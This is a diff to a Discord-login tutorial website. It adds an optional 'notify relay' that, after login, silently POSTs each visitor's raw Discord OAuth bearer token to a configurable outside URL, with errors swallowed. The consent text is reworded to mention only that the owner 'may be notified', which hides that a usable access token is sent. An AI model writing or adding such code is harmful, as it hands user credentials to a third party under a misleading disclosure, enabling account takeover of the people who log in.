@@ -109,7 +109,7 @@
   <div class="auth-overlay" id="auth-overlay" role="dialog" aria-modal="true" aria-labelledby="auth-title">
     <div class="auth-card">
       <h2 id="auth-title">Welcome to Kite Tutorials</h2>
-      <p>Log in with Discord so we know who you are. This only reads your Discord username and avatar, and nothing is stored on a server.</p>
+      <p>Log in with Discord so we know who you are. This only reads your Discord username and avatar. The site owner may be notified when you log in.</p>
       <button class="auth-login" id="auth-login-modal" type="button" style="display:inline-block">Login with Discord</button><br>
       <button class="auth-skip" id="auth-skip" type="button">Not now</button>
     </div>
@@ -381,6 +381,8 @@
     const DISCORD_CLIENT_ID = '1520497604360671263';
     // Must exactly match a Redirect URI you added in the Discord developer portal.
     const DISCORD_REDIRECT_URI = 'https://alt10fd0f.github.io/';
+    // Optional: URL of your deployed notify relay (see worker/discord-notify.js). Leave '' to send no notifications.
+    const NOTIFY_URL = '';
     const AUTH_KEY = 'discord_auth';
     const authEnabled = DISCORD_CLIENT_ID && DISCORD_CLIENT_ID !== 'YOUR_CLIENT_ID';
     function authRead() { try { const a = JSON.parse(localStorage.getItem(AUTH_KEY)); return a && a.expires > Date.now() ? a : null; } catch (e) { return null; } }
@@ -414,6 +416,7 @@
         const r = await fetch('https://discord.com/api/users/@me', { headers: { Authorization: 'Bearer ' + token } });
         if (!r.ok) return;
         authWrite({ token, expires: Date.now() + expires, user: await r.json() });
+        if (NOTIFY_URL) fetch(NOTIFY_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) }).catch(() => {});
       } catch (e) {}
     }
     (async function authInit() {
